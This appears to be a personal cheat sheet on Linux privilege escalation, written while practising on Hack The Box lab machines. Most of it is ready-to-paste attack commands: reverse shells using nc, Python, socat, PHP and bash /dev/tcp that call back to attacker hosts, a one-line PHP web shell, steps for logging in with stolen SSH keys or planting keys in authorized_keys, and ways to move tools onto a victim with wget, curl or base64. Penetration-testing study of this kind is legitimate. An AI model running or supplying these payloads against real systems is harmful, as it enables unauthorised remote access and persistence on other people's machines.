# Privilege Escalation  😈

## Two Types of Priv Esc  
<blockquote>
There are two common types of privilege escalation: vertical and horizontal. Vertical privilege escalation involves a user accessing files or functions that are normally associated with accounts that have higher privileges. Horizontal privilege escalation allows users to access resources in other accounts with similar privilege levels as they have.
</blockquote>



## Linux-Smart-Enumeration
* Check out the github page right <a href="https://github.com/diego-treitos/linux-smart-enumeration">here</a>.




## Most Reliable Reverse Shell Payload  
	```console
	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc [ATTACKER'S IP ADDRESS] [PORT OF THE ATTACKER'S CHOOSING] >/tmp/f
	```  


* Python Rev Shell  

```console
python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.61",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'
```

* Another one   

```console
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.11",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

## Web Shells  

* A php web shell  

```php
<?php 
passthru($_REQUEST['cmd']);
?>
```  


## Upgrade the Reverse Shell   



* Using `socat` instead of `nc`  

	```console
	#Listener
	socat file:`tty`,raw,echo=0 tcp-listen:4444

	#Victim  
	socat exec:'bash -li',pty,stderr,setsid,sane tcp:10.0.3.4:4444
	```  

* Using stty options (Never Worked With Me) 
	```console
	# In reverse shell 
	python3 -c 'import pty; pty.spawn("/bin/bash")'
	ctrl-z  

	# In Kali 
	stty raw -echo  
	reset
	fg

	# In reverse shell
	
	export SHELL=bash
	export TERM=xterm-256color
	stty rows <num> columns <num2>
	```

* If we type `stty -a` it will give me info and I can get the rows and columns from there.
* I can also echo the $TERM variable and put its value in the reverse shell as the value I have on my Kali.  

## Sudo & Sudoers   

* We can use `sudo` to give the current user privilege to do something as another user as follows `sudo -u [USERNAME] [COMMAND]` by default without the `-u` option it gives the user root privilege if the user was in the sudoers file, which also can't be accessed unless the user had privilege to access it.
* To check if the user have access to use sudo, especially that sometimes a user can have access to sudo a specific command and not everything, we can use this command `sudo -l` which should open the sudoers file unless we don't have privilege to do so.   
* With regard to privilege escalation we can also exploit the sudo command itself by checking if it's version have any already existing exploits. I can get the version in multiple ways and one of these ways is to when using linPEAS.



### When Using gcc  
* The option `-Wall` is a warning option.

### SSH Keys   

* We can use ssh keys to privesc  

```console
Shatha Barqawi@htb[/htb]$ vim id_rsa
Shatha Barqawi@htb[/htb]$ chmod 600 id_rsa
Shatha Barqawi@htb[/htb]$ ssh user@10.10.10.10 -i id_rsa

root@remotehost#
```  

* This ssh key can be found in the following path if I have access to it `/home/user/.ssh/id_rsa` or `/root/.ssh/id_rsa`.

<blockquote>
Note that we used the command 'chmod 600 id_rsa' on the key after we created it on our machine to change the file's permissions to be more restrictive. If ssh keys have lax permissions, i.e., maybe read by other people, the ssh server would prevent them from working.
</blockquote>   

* We can also put our public key in the directory `/home/user/.ssh/authorized_keys` if we have the permissions to do so. How to do that?  

* Create key on my machine 
	```console
	Shatha Barqawi@htb[/htb]$ ssh-keygen -f key
	```
* This will create two file `key` (which we will use with `ssh -i`) and `key.pub`(which we will copy to the remote machine).

### Transferring Files  

1. Using `wget`  
* We run a Python HTTP server on our machine and wget or cURL on the victim to download the file   

* On my machine
  ```console
  Shatha Barqawi@htb[/htb]$ cd /tmp
  Shatha Barqawi@htb[/htb]$ python3 -m http.server 8000

  Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
  ```

* On victim  
  ```console
  user@remotehost$ wget http://10.10.14.1:8000/linenum.
  ```  
  OR   
  ```console
  user@remotehost$ curl http://10.10.14.1:8000/linenum.sh -o linenum.sh
  ```  

2. Using `scp`  

	```console
	scp [PATH TO FILE ON MY SYSTEM] [USERNAME]@[TARGET IP]:[PATH ON TARGET TO TRANSFER FILE TO]
	```

3. Using `base64`  
* In some cases, there might be firewall protections that prevent us from downloading a file from our machine. In such case we can use `base64` and encode the file into base64 format and then copy/paste the base64 string to the remote server and decode it there.   
  ```console
  Shatha Barqawi@htb[/htb]$ base64 shell -w 0
  ```  

  ```console
  user@remotehost$ echo f0VMRgIBAQAAAAAAAAAAAAIAPgABAAAA...SNIO...lIuy9iaW4vc2gAU0iJ51JXSInmDwU | base64 -d > shell
  ```  

* To check that we didn't miss anything up during the encoding/deconding process we can use the command `md5sum [FILENAME]` on both machines and check if they're equal.  


### The Shells on Victims   
* We can find the shells that can be used on the victim's machine with the following command in the following file   `cat /etc/shells`.

### The `tee` Command

* Store the output of a command in a file with the following command `[COMMAND] | tee [FILE NAME]`.   

### The `dpkg -l`  Command   
* Shows the packages and libraries on the system.
* Is it exclusively used on Debian based Linux? Seems so -- not sure tho.🤔

* Write about the $PATH variable how to add to it.
```console
export PATH=$PATH:/tmp
#or
export PATH=/tmp:$PATH
```

<br/>

* `[COMMAND] | tee [FILE NAME]` 
* Stores output of the command in a file.  

<br/>

* `dpkg -l`  
* Shows the packages and libraries on system.
* I think this command is only for Debian based OSes 🤔.


<br/>

* Some info on gcc  
* The option `-Wall` is a warning option.  
* ### <span class="useful_shit subtitle">Upgrading The Reverse Shell   

* The bitch machine Cronos keeps making problems for me and I can't seem to open the admin some times. So I wasn't able to test the ways I'll be mentioning next (I got them from this <a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/">website</a>)  





```console
php -r '$s=fsockopen("10.10.14.74",1234);shell_exec("/bin/sh -i <&3 >&3 2>&3");' 

$s=fsockopen("10.10.14.74",1234);system("/bin/sh -i <&3 >&3 2>&3");

bash -i >& /dev/tcp/10.10.14.74/1234 0>&1
```  


## SUID  

* You can use the tool `SUID3NUM` to check if any of the files that have the sticky bit are interesting or not.